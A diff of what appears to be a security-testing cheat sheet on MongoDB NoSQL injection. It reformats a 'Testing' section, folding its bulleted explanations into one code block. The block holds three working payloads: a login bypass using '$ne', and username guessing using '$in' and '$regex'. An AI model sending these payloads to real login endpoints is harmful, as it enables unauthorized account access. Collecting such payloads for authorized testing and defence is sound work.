@@ -112,20 +112,16 @@ MongoDB Query and Projection Operators: [https://www.mongodb.com/docs/manual/ref
 
 ### **Testing**
 
-**Login bypass**
+```markdown
+# Login bypass
+{"username":"bob","password":{"$ne":"invalid"}}
 
-* To test if you can bypass login try to use a valid credentials (example "bob:pass")
-  * `{"username":"bob","password":{"$ne":"invalid"}}`
-  * If it works you can try to bypass login with other username
+# Guess with usernames list
+{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
 
-**Guess with usernames list**
-
-* To target an account, you can construct a payload that includes a known username, or a username that you've guessed:&#x20;
-  * `{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}`
-
-**Guess with regex**
-
-`{"username":{"$regex":"^adm"},"password":{"$ne":""}}`
+# Guess with regex
+{"username":{"$regex":"^adm"},"password":{"$ne":""}}
+```
 
 **Other tests**
 
